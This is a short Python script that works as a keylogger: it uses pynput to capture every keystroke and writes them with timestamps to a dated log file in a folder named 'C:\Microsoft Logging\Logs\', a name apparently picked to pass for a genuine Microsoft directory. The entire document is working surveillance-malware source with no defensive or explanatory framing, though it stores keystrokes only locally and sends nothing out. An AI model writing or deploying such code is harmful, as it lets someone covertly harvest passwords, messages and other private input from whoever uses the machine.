from pynput.keyboard import Key, Listener
import logging
from datetime import date
import os

path = "C:\\Microsoft Logging\\Logs\\" # Your Path
try:
    os.makedirs(path)  # Making Directory Selected Path
except OSError as error:  
    pass
 
today = date.today() # Taking Today's Date
d1 = today.strftime("%d_%m_%Y") # Assigning Today's Date to Variable

# log_dir = path # Assigning Path to Variable
logging.basicConfig(filename=(path + f"{d1}_klog.logs"), level=logging.DEBUG, format='%(asctime)s %(message)s', datefmt='%I:%M:%S')
 
def on_press(key):
    logging.info("{0}".format(key)) # Format of Our Character
    
with Listener(on_press=on_press) as listener:
    listener.join()